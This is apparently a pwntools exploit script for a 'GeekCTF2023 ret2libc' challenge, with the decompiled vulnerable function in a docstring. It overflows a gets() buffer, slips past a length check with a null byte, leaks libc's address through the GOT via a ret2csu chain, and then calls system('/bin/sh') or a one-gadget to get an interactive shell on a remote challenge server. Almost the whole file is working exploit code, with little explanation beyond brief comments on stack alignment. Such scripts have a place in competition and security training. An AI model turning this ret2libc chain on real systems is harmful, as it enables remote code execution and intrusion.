"""GeekCTF2023 ret2libc
size_t vuln()
{
  size_t result;
  char s[16]; // [rsp+0h] [rbp-10h] BYREF

  write(1, "This challenge no backdoor!", 0x1BuLL);
  gets(s);
  result = strlen(s);
  if ( result > 0x10 )
  {
    write(1, "may you can pass it right?", 0x1AuLL);
    exit(1);
  }
  return result;
}
"""
from pwn import *
import re

binary = './chal'
padding = 0x10

l64 = lambda: u64(s.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
l32 = lambda: u32(s.recvuntil("\xf7")[-4:].ljust(4, b"\x00"))

elf = ELF(binary)
pad = 8 if elf.arch == 'amd64' else 4
warnings.filterwarnings("ignore", category=BytesWarning)
context(log_level='debug', arch=elf.arch, os='linux', binary=binary)

# s = process()
# gdb.attach(s, 'b*0x00040126D\nc')
s = remote('pwn.node.game.sycsec.com',30937)

ret = ROP(elf).find_gadget(['ret'])[0]

def leak_by_write():
    rop = ROP(elf)
    rop.raw(b'1\x00' + b'a' * (padding + pad - 2))
    write = elf.got['write']
    # 调用write函数，泄露libc的地址, rop.call 会自动 pop rdi, ret来传入参数
    rop.ret2csu(edi=1, rsi=write, rdx=0x30, call=write)
    rop.call('vuln')  # 调用main函数，使程序重新运行
    s.sendlineafter('backdoor!', rop.chain())


leak_by_write()
leak_addr = l64() if elf.arch == 'amd64' else l32()

# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") if elf.arch == 'amd64' else ELF("/lib/i386-linux-gnu/libc.so.6")
libc = ELF("./libc.so.6")
libc.address = leak_addr - libc.sym["write"]
success("leak_addr:" + hex(leak_addr))
success('libc:' + hex(libc.address))


def by_ogg():
    # ogg = 0x4527a  + libc.address  # local_libc
    ogg = 0xe3b04 + libc.address  # remote libc
    payload_ogg = flat(b'11111111\x00' + b'a' * (padding + pad - 9), ogg, ret)
    s.send(payload_ogg)


def by_system():
    system = libc.sym["system"]
    bin_sh = next(libc.search(b"/bin/sh"))
    rop = ROP(elf)

    ## m0.无对齐
    rop.raw(b'11111111\x00' + b'a' * (padding + pad - 9))
    rop.call(system, [bin_sh,0 ])

    ## m1.栈对齐
    # rop.raw(b'a' * (padding + pad) + p64(ret))
    # rop.call(system, [bin_sh])  # ret 是栈对齐，可能要删除,

    ## m2.栈对齐
    # rop.raw(b'a' * (padding + pad))
    # rop.call(system, [bin_sh, 0])  # '0' 是栈对齐，可能要删除,

    s.sendline(rop.chain())


# by_ogg()
by_system()
s.interactive()
